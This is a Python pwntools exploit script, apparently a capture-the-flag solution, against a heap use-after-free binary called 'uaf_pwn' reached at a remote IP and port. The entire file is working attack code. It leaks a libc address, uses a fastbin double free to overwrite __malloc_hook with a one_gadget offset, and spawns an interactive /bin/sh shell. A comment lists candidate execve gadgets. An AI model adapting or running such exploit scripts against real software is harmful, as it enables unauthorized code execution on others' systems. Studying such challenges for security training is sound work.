from pwn import *
context.log_level = 'debug'

def add(size):
	p.sendlineafter(">",str(1))
	p.sendlineafter(">",str(size))
def delete(id):
	p.sendlineafter(">",str(2))
	p.sendlineafter(">",str(id))
def edit(id,content):
	p.sendlineafter(">",str(3))
	p.sendlineafter(">",str(id))	
	p.sendafter(">",content)
def show(id):
	p.sendlineafter(">",str(4))
	p.sendlineafter(">",str(id))

p = process("./uaf_pwn")
p = remote("82.157.5.28",50702)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
chunk_list = int(p.recv(14),16)
print "chunk_list:",hex(chunk_list)

for i in range(2):
	add(0xf8)
delete(0)
add(0xf8)
show(0)
leak_addr = u64(p.recv(6).ljust(8,'\x00'))
print "leak_addr:",hex(leak_addr)
libc_base = leak_addr - (0x7ffff7dd1b78-0x7ffff7a0d000)
print "libc_base:",hex(libc_base)
malloc_hook = libc_base + libc.sym['__malloc_hook']-0x23
print "malloc_hook:",hex(malloc_hook)

for i in range(3):
	add(0x68)
delete(3)
delete(4)
delete(3)

add(0x68)
edit(6,p64(malloc_hook))
add(0x68)
edit(7,p64(malloc_hook))
add(0x68)
edit(8,p64(malloc_hook))
add(0x68)	#9
edit(9,'\x00'*0x13+p64(libc_base+0x4527a))
'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''

#gdb.attach(p)
#raw_input()

p.sendlineafter(">",str(1))
p.sendlineafter(">",str(0x68))


p.interactive()